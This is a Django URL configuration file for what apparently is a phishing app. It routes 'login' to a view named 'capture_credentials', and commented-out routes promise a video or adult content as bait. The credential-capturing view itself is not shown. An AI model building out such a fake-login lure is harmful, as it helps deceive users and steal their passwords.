from django.urls import path
from . import views
from .views import got_it

urlpatterns = [
    path('login', got_it.as_view(), name='capture_credentials'),
    #path("", views.play_video, name = "play_video"),
    #path("you_can_watch_that_porn_<3", views.continue_watching, name = "continue_watching"),

]
